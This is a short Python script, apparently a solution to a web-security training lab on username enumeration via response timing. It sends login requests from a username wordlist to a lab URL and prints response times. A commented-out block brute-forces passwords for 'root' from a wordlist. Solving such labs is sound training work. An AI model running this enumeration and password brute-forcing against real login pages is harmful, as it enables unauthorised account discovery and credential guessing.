# Lab: Username enumeration via response timing
import requests

URL = "https://0a03009e04dcc5c58089e94200a600c1.web-security-academy.net/login"

# Détermine le correct user
with open("username.txt", 'r') as users_file:
    for user in users_file:
        user = user.strip('\n')
       
        data = {'username': user, 'password': "xxx"}

        response = requests.post(URL, data=data)

        print(response.elapsed)

# Détermine son password
# with open("password.txt", 'r') as passwords_file:
#     for password in passwords_file:
#         password = password.strip('\n')
#         data = {'username': "root", 'password': password}

#         response = requests.post(URL, data=data)

#         if 'Incorrect password' not in response.text:
#             print("Login réussi avec:", data)
#             break